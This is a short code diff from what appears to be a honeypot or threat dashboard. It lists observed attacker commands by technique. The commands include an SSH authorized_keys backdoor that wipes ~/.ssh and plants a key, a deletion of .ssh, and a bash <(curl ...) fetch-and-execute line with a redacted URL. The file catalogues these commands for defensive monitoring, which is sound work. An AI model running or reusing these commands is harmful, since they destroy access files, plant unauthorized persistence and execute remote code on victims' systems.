@@ -54,7 +54,7 @@
   // The live counts come from the exporter’s 24-hour technique matches; they are not exact-string counts.
   const observedCommandExamples = Object.freeze({
     "SSH authorized_keys modification attempt": 'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa [REDACTED_KEY] mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
-    "SSH key file removal attempt": 'cd ~; chattr -ia .ssh; lockr -ia .ssh',
+    "SSH key file removal attempt": 'cd ~ && rm -rf .ssh && mkdir .ssh',
     "Remote file retrieval command": 'bash <(curl -sL [REDACTED_URL] -e [REDACTED_URL] --auto-discovery [REDACTED_TOKEN])',
     "Scheduled persistence reference": 'crontab -l'
   });
